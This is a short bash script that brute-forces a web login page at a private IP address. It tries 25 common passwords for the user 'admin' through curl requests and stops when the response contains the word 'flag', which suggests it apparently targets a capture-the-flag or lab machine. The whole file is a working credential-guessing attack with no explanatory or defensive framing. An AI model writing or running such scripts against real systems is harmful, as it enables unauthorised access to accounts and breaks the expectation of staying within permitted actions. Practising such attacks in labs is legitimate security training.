#!/bin/bash

passwords=(123456 password 12345678 qwerty abc123 123456789 111111 1234567 iloveyou adobe123 123123 Admin 1234567890 letmein photoshop 1234 monkey shadow sunshine 12345 password1 princess azerty trustno1 000000)

for pw in "${passwords[@]}"; do
    echo "Trying password: $pw"
    result=$(curl -s -X POST "http://10.12.250.232/index.php?page=signin&username=admin&password=${pw}&Login=Login#")
    
    if echo "$result" | grep -q 'flag'; then
        echo -e "\n✅ Success! Password is: $pw"
        echo "$result" | grep 'flag'
        break
    fi
done
